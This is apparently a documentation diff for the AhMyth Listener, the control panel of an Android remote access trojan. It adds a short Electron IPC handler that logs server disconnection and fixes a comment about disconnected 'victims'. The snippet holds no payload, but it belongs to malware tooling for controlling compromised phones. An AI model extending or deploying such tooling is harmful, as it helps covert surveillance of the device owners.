@@ -152,7 +152,7 @@ Stop function for the AhMyth Listener | Main.js = Line 262 --> Line 333 |
       win.webContents.send('SocketIO:RemoveVictim', index);
 
       if (windows[index]) {
-        //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
+        //notify renderer proccess (LabCtrl) if opened about the server disconnection
         BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerDisconnected");
         //delete the window from windowsList
         delete windows[index]
@@ -207,6 +207,15 @@ ipcMain.on('closeLabWindow', function (e, page, index) {
     }
   })
 });
+```
+
+Stop function for the AhMyth Listener | LabCtrl.js = Line 86 --> 90 |
+```javascript
+    //fired when notified from Main Proccess (main.js) about
+    // the server who disconnected
+    ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
+        $rootScope.Log('Server Disconnected', CONSTANTS.logStatus.SUCCESS);
+    });
 ```
 
 Stop function for the AhMyth Listener | index.html = Line 69 |
